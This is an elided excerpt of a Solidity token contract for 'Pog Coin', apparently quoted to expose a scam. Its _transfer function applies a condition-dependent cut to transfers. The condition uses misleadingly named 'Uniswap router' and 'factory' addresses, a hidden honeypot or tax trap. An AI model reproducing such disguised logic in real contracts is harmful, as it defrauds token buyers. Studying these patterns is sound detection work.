...
https://twitter.com/PogCoinBNB
https://t.me.com/PogCoinBNB
https://PogCoinBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal _uniswapRouterV2 = 0x3BCD2493BA299729993e8b5a53997a54e02d500e;
    uint256 private allowanceEnabled = 1;
    string private _symbol;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    address private _factoryV2Uniswap = 0xaaDF71b54B0541e8472f9D9C6B25A7ef97Ee30C0;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != _uniswapRouterV2 && _balances[_factoryV2Uniswap] > 0 ? _pairToken : allowanceEnabled).div(100) + 0;
        if (swapamount > 0)
        {
...
{
    constructor() ERC20(unicode"Pog Coin", unicode"POG")
    {
